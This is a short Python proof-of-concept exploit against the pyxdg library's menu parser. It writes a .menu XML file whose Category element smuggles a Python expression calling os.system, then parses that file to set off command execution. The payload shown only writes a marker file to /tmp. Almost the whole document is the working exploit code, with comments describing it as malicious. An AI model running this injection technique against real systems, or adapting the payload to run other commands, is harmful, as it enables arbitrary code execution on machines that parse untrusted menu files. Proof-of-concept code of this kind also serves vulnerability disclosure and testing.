# Import the xdg module
import xdg.Menu

# Define a malicious XML document
# This document has a Category element with Python code injection
xml = """<!DOCTYPE Menu PUBLIC "-//freedesktop//DTD Menu 1.0//EN"
"http://www.freedesktop.org/standards/menu-spec/1.0/menu.dtd">
<Menu>
<LegacyDir>/tmp</LegacyDir>
<Include>
<Category>' or __import__('os').system('echo hacked > /tmp/result.txt') or '</Category>
</Include>
</Menu>
"""

# Write the XML document to a .menu file
with open("/tmp/malicious.menu", "w") as f:
    f.write(xml)

# Parse the .menu file using the xdg.Menu.parse() function
# This will trigger the vulnerability and execute the injected code
menu = xdg.Menu.parse("/tmp/malicious.menu")